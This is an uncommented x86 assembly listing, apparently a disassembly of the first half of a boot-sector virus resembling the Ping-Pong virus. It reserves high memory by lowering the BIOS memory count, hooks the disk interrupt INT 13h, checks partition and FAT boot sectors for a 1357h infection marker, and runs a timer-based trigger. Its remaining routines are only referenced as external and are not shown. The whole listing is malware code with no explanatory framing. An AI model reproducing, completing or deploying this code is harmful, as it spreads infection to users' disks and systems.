	name	boot1_asm
	.radix	16

start:
	jmp	boot

	db	'IBM  3.3'
	dw	200
	db	2
	dw	1
	db	2
	dw	70
	dw	2D0
	db	0FDh
	dw	2
	dw	9
	dw	2
	dw	0

boot:
	xor	ax,ax
	mov	ss,ax
	mov	sp,7C00
	mov	ds,ax
	mov	ax,[413]
	sub	ax,2
	mov	[413],ax
	mov	cl,6
	shl	ax,cl
	sub	ax,7C0
	mov	es,ax
	mov	si,7C00
	mov	di,si
	mov	cx,100
	rep	movsw
	db	8E,0C8
;	mov	cs,ax
	push	cs
	pop	ds
	call	n_00014A
n_00014A:
	xor	ah,ah
	int	13
	and	byte ptr [7DF8],80
	mov	bx,[7DF9]
	push	cs
	pop	ax
	sub	ax,20
	mov	es,ax
	call	n_00019D
	mov	bx,[7DF9]
	inc	bx
	mov	ax,0FFC0
	mov	es,ax
	call	n_00019D
	xor	ax,ax
	mov	byte ptr [7DF7],al
	mov	ds,ax
	mov	ax,[4C]
	mov	bx,[4E]
	mov	[4C],7CD0
	mov	[4E],cs
	push	cs
	pop	ds
	mov	[7D2A],ax
	mov	[7D2C],bx
	mov	dl,byte ptr [7DF8]
	jmp	far ptr f_007C00

	mov	ax,301
	jmp	short n_0001A0
n_00019D:
	mov	ax,201
n_0001A0:
	xchg	ax,bx
	add	ax,[7C1C]
	xor	dx,dx
	div	word ptr [7C18]
	inc	dl
	mov	ch,dl
	xor	dx,dx
	div	word ptr [7C1A]
	mov	cl,6
	shl	ah,cl
	or	ah,ch
	mov	cx,ax
	xchg	ch,cl
	mov	dh,dl
	mov	ax,bx
n_0001C3:
	mov	dl,byte ptr [7DF8]
	mov	bx,8000
	int	13
	jnb	n_0001CF
	pop	ax
n_0001CF:
	ret

	push	ds
	push	es
	push	ax
	push	bx
	push	cx
	push	dx
	push	cs
	pop	ds
	push	cs
	pop	es
	test	byte ptr [7DF7],1
	jne	n_000223
	cmp	ah,2
	jne	n_000223
	cmp	byte ptr [7DF8],dl
	mov	byte ptr [7DF8],dl
	jne	n_000212
	xor	ah,ah
	int	1A
	test	dh,7F
	jne	n_000203
	test	dl,0F0
	jne	n_000203
	push	dx
	call	n_0003B3
	pop	dx
n_000203:
	mov	cx,dx
	sub	dx,[7EB0]
	mov	[7EB0],cx
	sub	dx,24
	jb	n_000223
n_000212:
	or	byte ptr [7DF7],1
	push	si
	push	di
	call	n_00022E
	pop	di
	pop	si
	and	byte ptr [7DF7],0FE
n_000223:
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	pop	es
	pop	ds
	jmp	far ptr f_0C833E

n_00022E:
	mov	ax,201
	mov	dh,0
	mov	cx,1
	call	n_0001C3
	test	byte ptr [7DF8],80
	jz	n_000263
	mov	si,81BE
	mov	cx,4
n_000246:
	cmp	byte ptr [si+4],1
	je	n_000258
	cmp	byte ptr [si+4],4
	je	n_000258
	add	si,10
	loop	n_000246
	ret

n_000258:
	mov	dx,[si]
	mov	cx,[si+2]
	mov	ax,201
	call	n_0001C3
n_000263:
	mov	si,8002
	mov	di,7C02
	mov	cx,1C
	rep	movsb
	cmp	[81FC],1357
	jne	n_00028B
	cmp	byte ptr [81FBh],0
	jnb	n_00028A
	mov	ax,[81F5]
	mov	[7DF5],ax
	mov	si,[81F9]
	jmp	n_000392
n_00028A:
	ret

n_00028B:
	cmp	[800Bh],200
	jne	n_00028A
	cmp	byte ptr [800Dh],2
	jb	n_00028A
	mov	cx,[800E]
	mov	al,[8010]
	cbw
	mul	word ptr [8016]
	add	cx,ax
	mov	ax,20
	mul	word ptr [8011]
	add	ax,1FF
	mov	bx,200
	div	bx
	add	cx,ax
	mov	word ptr [7DF5],cx
	mov	ax,[7C13]
	sub	ax,[7DF5]
	mov	bl,[7C0Dh]
	xor	dx,dx
	xor	bh,bh
	div	bx
	inc	ax
	mov	di,ax
	and	byte ptr [7DF7],0FBh
	cmp	ax,0FF0
	jbe	n_0002E0
	or	byte ptr [7DF7],4
n_0002E0:
	mov	si,1
	mov	bx,[7C0E]
	dec	bx
	mov	[7DF3],bx
	mov	byte ptr [7EB2],0FE
	jmp	short n_000300

	db	1,0,0C,0,1,0,48,1,0,57,13

	dw	0AA55

n_000300:

	extrn	n_000392:near,n_0003B3:near
	extrn	f_007C00:far,f_0C833E:far
